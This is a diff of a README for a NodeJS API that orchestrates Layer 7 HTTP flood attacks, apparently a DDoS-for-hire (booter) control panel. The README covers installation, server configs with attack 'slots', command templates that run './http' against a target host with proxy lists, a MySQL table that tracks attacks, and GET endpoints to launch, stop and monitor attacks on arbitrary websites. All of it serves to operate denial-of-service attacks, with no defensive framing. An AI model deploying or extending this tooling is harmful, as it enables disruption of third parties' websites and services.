@@ -1,4 +1,4 @@
-<h2>NodeJS API for Layer 7 attacks</h2>
+<h2>NodeJS API for Layer 7 attacks (Updated 25 Feb, 2024)</h2>
 
 <h3>Coded by forky (tg: @yfork)</h3>
 
@@ -8,9 +8,9 @@
 <h1>Installation:</h1>
 
 ```sh
-curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
-sudo apt -y install nodejs
-npm i express
+curl -fsSL https://deb.nodesource.com/setup_21.x | sudo -E bash - &&\
+sudo apt-get install -y nodejs
+npm i express mysql
 ```
 
 <h1>Setup:</h1>
@@ -19,15 +19,17 @@ npm i express
 
 ```json
 {
-    "alpha": {
-        "name": "alpha",
-        "ip": "1.1.1.1",
-        "port": 3000
+    "1": {
+        "name": "1",
+        "host": "1.1.1.1",
+        "port": 3000,
+        "slots": 15
     },
-    "beta": {
-        "name": "beta",
-        "ip": "2.2.2.2",
-        "port": 3000
+    "2": {
+        "name": "2",
+        "host": "2.2.2.2",
+        "port": 3000,
+        "slots": 15
     }
 }
 ```
@@ -37,27 +39,54 @@ npm i express
 ```json
 {
     "HTTPGET": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
-    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}",
-    "STOP": "screen -dm pkill -f ${host}"
+    "HTTPPOST": "screen -dmS attack_${attack_id} ./http ${host} proxies.txt ${time}"
 }
 ```
 
-<h3>Update api.js:</h3><br>
+<h3>Update settings.json</h3><br>
 
-```js
-const api_port = 8888; //API Port
-const socket_token = "SOCKET_TOKEN"; // TCP Socket token, use random numbers/letters
-const api_key = "API_KEY"; // your API Key
-const domain_lock = false; // lock api to only be used from a specific domain
-const api_domain = 'example.com'; // your API domain (if domain_lock is set to true)
+```json
+{
+    "database": {
+        "host": "localhost",
+        "user": "DATABASE_USER",
+        "password": "DATABASE_PASSWORD",
+        "database": "DATABASE_NAME"
+    },
+    "socket_token": "SECRET_TOKEN", 
+    "api_port": 3000
+}
 ```
 
-<h3>Update socket.js:</h3><br>
+<h3>Update client.js:</h3><br>
 
 ```js
 const socket_port = 3000;
 const socket_token = "SOCKET_TOKEN";
 const allowed_ips = ['1.1.1.1'];
+```
+
+<h3>Setup the Database</h3><br>
+
+```sql
+CREATE DATABASE manager;
+
+use manager;
+
+CREATE TABLE `attacks` (
+    `id` int(11) NOT NULL,
+    `server` varchar(300) DEFAULT NULL,
+    `target` text DEFAULT NULL,
+    `duration` int(11) NOT NULL,
+    `method` varchar(255) DEFAULT NULL,
+    `date_sent` int(11) DEFAULT NULL,
+    `stopped` int(11) NOT NULL DEFAULT 0,
+    `attack_id` int(11) DEFAULT NULL
+);
+
+ALTER TABLE `attacks` ADD PRIMARY KEY (`id`);
+
+ALTER TABLE `attacks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 ```
 
 ## After that, upload socket.js to the attack servers and upload api.js, servers.json and commands.json to the API server
@@ -83,11 +112,17 @@ Replace `'http://backend:3000/api/attack'` with your API server URL
 
 Send a GET request to the API using the required fields
 
-GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=HTTPGET&server=alpha`
+GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=HTTPGET`
 
-You can set &server=all to launch to all servers
+You can stop the attacks by sending a GET request to the API using the attack ID
 
-You can stop the attacks by sending a GET request to the API using &method=stop
+GET `https://api.yourdomain.com/api/stop?attack_id=[id]`
 
-GET `https://api.yourdomain.com/api/attack?host=https://website.com&time=120&method=stop&server=alpha`
+You can also view all running attacks and server usage by sending a GET request to the API
+
+GET `https://api.yourdomain.com/api/status`
+
+You can also stop all the attacks sending a GET request to the API
+
+GET `https://api.yourdomain.com/api/stop_all`
 
